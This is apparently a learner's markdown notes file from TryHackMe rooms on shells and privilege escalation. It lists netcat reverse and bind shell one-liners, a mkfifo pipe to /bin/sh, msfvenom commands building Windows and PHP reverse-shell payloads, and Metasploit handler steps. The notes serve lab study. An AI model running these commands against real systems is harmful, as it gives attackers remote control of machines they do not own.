# R

* Remember for web/general/security
* .todo: metasploit dns
* .todo: web
* web general | terminology | URL may have to be moved
* explose hacking_process

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* https://tryhackme.com/room/introtoshells
* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* nc ip port -e /bin/bash (rev shell)
* nc -lvnp port -e /bin/bash (bind shell)
* this is not included in most versions of netcat
* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
* https://tryhackme.com/room/introtoshells (Windows)
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
* staged reverse shell payloads and stageless
* exploit/multi/handler
  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
  * `set PAYLOAD X`
  * `exploit -j`
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
  * Read again the section: https://tryhackme.com/room/introtoshells
  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
* Socat: transfer the socat binary
* Reverse shells/... note lasty

<hr>

## Overconfidence

--- https://tryhackme.com/room/rrootme

* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
* exploit/multi/handler
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
* `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4455 -o revshell3.php5`
* `sudo bash -c "id"`
* https://www.revshells.com/
* TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
* writeups

--- https://tryhackme.com/room/vulnversity

* Capture a request uploading a file
* Intruder to test which filetype is not blocked
* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o mrevshell.phtml`
  * No one can make it work!!!
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o mrevshell_php_rtcp.phtml`

```
set LHOST tun0
set PAYLOAD payload/php/meterpreter/reverse_tcp
exploit -j
sessions -u 1
sessions -i 2
```